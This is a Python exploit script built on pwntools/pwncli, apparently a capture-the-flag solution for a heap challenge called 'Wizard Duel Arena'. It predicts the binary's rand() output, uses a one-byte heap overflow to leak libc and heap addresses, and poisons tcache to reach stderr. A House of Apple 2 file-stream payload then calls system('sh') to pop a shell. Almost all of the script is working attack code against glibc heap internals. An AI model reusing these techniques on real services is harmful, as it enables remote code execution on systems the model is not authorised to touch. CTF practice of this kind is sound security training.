#!/usr/bin/env python3
from ctypes import CDLL
from subprocess import Popen, PIPE
from pwncli import *
import sys
from os import path
import traceback
# =========================================================
#                          SETUP                         
# =========================================================
exe = path.join(path.dirname(__file__) or '.', 'chall_patched')
context.bits = 64
context.arch = 'amd64'
try: elf = context.binary = ELF(exe, checksec=False)
except: elf = type('S',(),{'address':0})()
try: libc = elf.libc
except: libc = type('S',(),{'address':0})()
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
lib = CDLL("libc.so.6")
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]


gdbscript = '''
init-pwndbg
# set architecture aarch64
# target remote :5000
c
'''.format(**locals())




is_ipv4 = lambda s: len(s.split('.')) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in s.split('.'))
is_domain = lambda s: all(part.isalnum() or part == '-' for part in s.split('.'))
is_port = lambda s: s.isdigit() and 0 <= int(s) <= 65535
use_ip = lambda: len(sys.argv) >= 3 and (is_ipv4(sys.argv[1]) or is_domain(sys.argv[1])) and is_port(sys.argv[2])

def initialize(argv=[]):
    global pid
    update_checksec() 
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'debug'
        host, port = ("remote.infoseciitr.in", 8006) if len(sys.argv) < 4 else (sys.argv[2], int(sys.argv[3]))
        return remote(host, port, ssl=False)
    elif use_ip():
        context.log_level = 'info'
        host, port = str(sys.argv[1]), int(sys.argv[2])
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv)

def execute(cmds, verbose=False):
    cmds = cmds if isinstance(cmds, list) else cmds.split()
    if verbose:
        sys.stdout.write("\n")
        sys.stdout.flush()
        p = Popen(cmds, stdout=PIPE, stderr=sys.stdout, text=True, bufsize=1)
        buf = []
        for line in p.stdout:
            sys.stdout.write(line)   # live output (colors intact)
            sys.stdout.flush()
            buf.append(line)         # keep copy
        p.wait()
        return "".join(buf)
    else:
        p = Popen(cmds, stdout=PIPE, stderr=PIPE, text=True)
        out, err = p.communicate()
        return out if out else err


def open_split_tmux(cmd):
    cmd = cmd.split() if isinstance(cmd, str) else cmd
    execute(["tmux", "splitw", "-h", "-p", "65"] + cmd)

def debug():
    global gdbscript, pid
    if ((not args.REMOTE and not args.GDB) or (args.QEMU and args.GDB)) and not use_ip():
        if args.QEMU:
            open_split_tmux(["gdb"] + [a for c in filter(None, gdbscript.strip().splitlines()) for a in ["-ex", c.strip()]])
        elif args.DOCKER:
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe=exe)
        else:
            attach(io, gdbscript=gdbscript)

def update_checksec():
    marker = "CHECKSEC"
    fn = sys.modules[__name__].__file__
    with open(fn, "r+", encoding="utf-8") as f:
        src = f.read()
        i = src.find(marker)
        i = src.find(marker, i + 1)
        i = src.find("\n", i)
        i = src.find("\n", i + 1)
        start = i + 1
        end = src.find("\n", start)
        if end == -1: 
            end = len(src)
        if src[start:end].strip() == "":
            output = execute(["checksec", "--file", exe])
            commented = "".join(("# " + line + "\n") if line.strip() else "#\n" for line in output.splitlines())
            src = src[:start] + commented + src[end:]
            f.seek(0); f.write(src); f.truncate()

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
se      = lambda data               :str(data).encode()
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda num, data=None     : u32((io.recv(num) if not data else io.recvuntil(data)[-num:]).ljust(4, b"\x00"))
uu64    = lambda num, data=None     : u64((io.recv(num) if not data else io.recvuntil(data)[-num:]).ljust(8, b"\x00"))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))

# =========================================================
#                         CHECKSEC
# =========================================================
#     Arch:       amd64-64-little
#     RELRO:      Full RELRO
#     Stack:      Canary found
#     NX:         NX enabled
#     PIE:        PIE enabled
#     RUNPATH:    b'.'
#     SHSTK:      Enabled
#     IBT:        Enabled
#     Stripped:   No

# =========================================================
#                         EXPLOITS
# =========================================================
def menu(choice):
    """Select a menu choice (sends the choice at the main prompt)."""
    sla(">> ", str(choice))


def do_learn(slot: int, guess: bytes or str):
    """Perform the full 'Learn the spell' flow:
    1) select menu option 1
    2) send the slot index
    3) send the guess (fgets)
    """
    sla(">> ", "1")
    sla(">> ", str(slot))
    sla("Enter your guess: ", guess)


def do_dodge():
    """Select the 'Dodge the spell' option (2)."""
    sla(">> ", "2")


def do_forget(slot: int):
    """Select 'Forget the spell' (3) for given slot."""
    sla(">> ", "3")
    sla(">> ", str(slot))


def do_remember(slot: int, timeout=2):
    """Select 'Remember the spell' (4) and return the printed spell bytes.

    This reads until the newline the program prints after fwrite + putchar(10).
    """
    sla(">> ", "4")
    sla(">> ", str(slot))
    # wait for the marker that precedes the raw spell output
    ru("here is your spell >> ")


def do_add_special(slot: int, size: int, payload: bytes or str):
    """Select 'Add your special spell' (5), provide size and payload.

    Note: `size` must match what the binary expects (1-48). The function will
    send size (for scanf) then the payload (for fgets).
    """
    sla(">> ", "5")
    sla(">> ", str(slot))
    sla("length of your spell(1-48) >> ", str(size))
    sla("Enter your special spell: ", payload)

def exit_and_send(payload1: bytes, payload2: bytes):
    """Select exit (6) and send two raw 0xE8-sized payloads to the two reads.

    The program does two raw `read(0, buf, 0xE8)` calls after prompts. This
    helper will wait for the prompts and send the provided payloads (they will
    be truncated/padded to 0xE8 bytes).
    """
    SLA_PROMPT = "before leaving you need to summon all your magic and knowledge to me >> "
    sla(">> ", "6")
    # wait for the prompt printed before the first read
    ru(SLA_PROMPT)
    p1 = payload1 if isinstance(payload1, (bytes, bytearray)) else str(payload1).encode()
    p2 = payload2 if isinstance(payload2, (bytes, bytearray)) else str(payload2).encode()
    # ensure lengths
    p1 = (p1 + b"\x00" * 0xE8)[:0xE8]
    io.send(p1)
    # the program prints another prompt before the second read
    ru("hey hey do you really think you can trick me, where are you going without telling me your special spell >> ")
    p2 = (p2 + b"\x00" * 0xE8)[:0xE8]
    io.send(p2)

enemy_spells = [
    "amaterasu",
    "Rasengan",
    "Shadow_Clone_Jutsu",
    "Sand_Coffin",
    "Rasenshuriken_Expansion!",
    "arcane_blast_of_the_void!",
    "planetary_devastation",
    "etherial_barrier",
    "lightning_chain",
]

def gen_spell_idx():
    return lib.rand() % 8

def get_next_spell_pattern(target):
    while enemy_spells[gen_spell_idx()] != target:
        do_dodge()

def overflow_with(val, idx):
    do_forget(idx)
    get_next_spell_pattern(enemy_spells[5])
    do_learn(idx, b"Z?Z?Z?Z?Z?Z?Z?Z?Z?Z?Z?Z?" + p8(val) + b"?.")

def alloc(idx, size_0x30=False):
    if size_0x30:
        get_next_spell_pattern(enemy_spells[5])
        idx_spell = 5
    else:
        idx_spell = gen_spell_idx()
        while idx_spell == 5:
            idx_spell = gen_spell_idx()
            do_dodge()
    do_learn(idx, enemy_spells[idx_spell].encode())

def fsop_shell(fp=None, rip=None, exit=True):
    io_obj = IO_FILE_plus_struct()
    fn = (
        io_obj.house_of_apple2_execmd_when_exit
        if exit
        else io_obj.house_of_apple2_execmd_when_do_IO_operation
    )
    return fn(
        fp if fp is not None else libc.sym["_IO_2_1_stdout_"],
        libc.sym["_IO_wfile_jumps"],
        rip if rip is not None else libc.sym["system"],
        "sh",
    )

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit(x):
    global io
    io = initialize()
    debug()
    ru("=== Wizard Duel Arena ===")
    lib.srand(lib.time(None) + 1)
    with log.progress("Leaking address"), context.local(log_level='debug'):
        for i in range(8):
            alloc(i)
        for i in range(3, 8):
            do_forget(i)
        for i in range(3):
            do_forget(i)
        alloc(1)
        alloc(0)
        overflow_with(0x61, 0)
        sla(">> ", "4")
        sla(">> ", b"1".rjust(1024, b"0"))
        ru("here is your spell >> ")
        r(0x20)
        libc_leak = u64(r(8))
        r(0x18)
        heap = u64(r(8)) << 12
        libc.address = libc_leak - 0x203b30

    leak("Heap base", hex(heap))
    leak("Libc leak", hex(libc_leak))
    with log.progress("Overlapping chunks"), context.silent:
        for i in reversed(range(2, 8)):
            alloc(i)
        overflow_with(0x21, 0)

        overflow_with(0xf1, 1)
        overflow_with(0xf1, 3)
        do_forget(4)

        do_forget(2)
        overflow_with(0x31, 0)
        do_forget(1)
        do_add_special(1, 0x28, b"A"*0x18 + p64(0xf1) + p64(mangle(heap, libc.sym["_IO_2_1_stderr_"])))
        exit_and_send(
            fsop_shell(libc.sym["_IO_2_1_stderr_"], exit=True),
            fsop_shell(libc.sym["_IO_2_1_stderr_"], exit=True),
        )
    leak("ELF base address", hex(elf.address)) if elf.address else None
    leak("Libc base address", hex(libc.address)) if libc.address else None
    io.interactive() if not args.NOINTERACT else None

if __name__ == '__main__':
    global io
    for i in range(1):
        try:
            exploit(i)
        except Exception as e:
            sys.stderr.write(traceback.format_exc())
        io.close()